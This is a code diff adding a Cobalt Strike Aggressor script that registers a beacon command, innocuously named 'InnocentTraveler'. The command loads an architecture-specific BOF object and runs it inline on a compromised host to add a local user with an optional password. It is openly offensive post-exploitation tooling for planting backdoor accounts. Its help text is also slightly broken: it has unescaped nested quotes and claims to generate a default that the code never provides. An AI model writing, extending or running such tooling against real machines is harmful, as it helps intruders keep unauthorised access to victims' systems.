@@ -1,0 +1,25 @@
+beacon_command_register(
+    "InnocentTraveler", 
+    "Adds a local user with optional password. If not provided, "defaultuser" is generated.",
+    "Usage: InnocentTraveler <username> [password]\n"
+);
+
+alias InnocentTraveler {
+    local('$bid $barch $handle $data $args $uname $pass @tokens $input');
+
+    $bid = $1;
+    $input = substr($0, 17); # strip "InnocentTraveler "
+
+    @tokens = split(" ", $input);
+
+    $uname = @tokens[0];
+    $pass  = iff(size(@tokens) > 1, @tokens[1], "");
+
+    $barch = barch($bid);
+    $handle = openf(script_resource("InnocentTraveler." . $barch . ".o"));
+    $data = readb($handle, -1);
+    closef($handle);
+
+    $args = bof_pack($bid, "zz", $uname, $pass);
+    beacon_inline_execute($bid, $data, "go", $args);
+}
